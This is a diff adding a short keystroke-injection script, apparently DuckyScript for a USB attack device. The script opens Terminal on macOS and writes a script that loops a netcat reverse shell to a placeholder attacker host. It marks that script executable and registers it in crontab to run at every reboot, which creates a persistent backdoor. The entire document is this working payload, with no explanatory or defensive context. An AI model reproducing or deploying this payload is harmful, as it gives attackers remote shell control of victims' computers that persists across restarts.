@@ -1,0 +1,12 @@
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 500
+STRING echo 'while :; do nc -e /bin/bash attacker_ip attacker_port; sleep 5; done &' > ~/.persistent_backdoor.sh
+ENTER
+STRING chmod +x ~/.persistent_backdoor.sh
+ENTER
+STRING echo '@reboot ~/.persistent_backdoor.sh' | crontab -
+ENTER
